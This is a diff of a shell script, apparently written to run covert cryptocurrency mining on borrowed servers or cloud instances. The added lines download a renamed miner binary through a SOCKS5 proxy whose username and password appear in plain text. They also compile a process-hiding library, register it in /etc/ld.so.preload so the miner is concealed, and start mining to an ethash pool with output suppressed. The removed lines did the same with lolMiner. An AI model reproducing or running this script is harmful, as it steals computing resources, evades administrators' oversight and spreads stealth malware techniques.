@@ -1,43 +1,46 @@
-apt update && apt -y install sudo wget curl unzip
-
-sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-
-apt-get install -y nodejs
-
-npm i -g node-process-hider
-
+#!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-
 dpkg-reconfigure --frontend noninteractive tzdata
 
-wget https://github.com/DeniBogeh/DeniBogehh/raw/main/graphics.tar.gz
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 =  45.140.13.119:9132 
-socks5_username = xdbmcihl
-socks5_password = dqvyy7oj3b12
+socks5 = 176.53.133.217:57597
+socks5_username = 2BHVpyGPD
+socks5_password = 1rN14HAmV
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
 sleep .2
 
+echo " "
+echo " "
+
+echo " "
+
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
+echo " "
 
 echo " "
 
-./graftcp/graftcp wget https://github.com/DeniBogeh/DeniBogehh/raw/main/lolMiner
+echo " "
+echo " "
 
-chmod +x lolMiner
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
 
-ph add lolMiner
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lolMiner --algo ETHASH --pool 172.65.247.152:4444 --user 7C86A8aa5482c0e35f193187A57f0D659092e916.$(echo $(shuf -i 1-999 -n 1)-PHO)
+./graftcp/graftcp ./bezzHash --url=teguhcong.$(echo $(shuf -i 1-99999 -n 1)-KENT)@stratum+tcp://ethash.poolbinance.com:1800 >/dev/null 2>&1
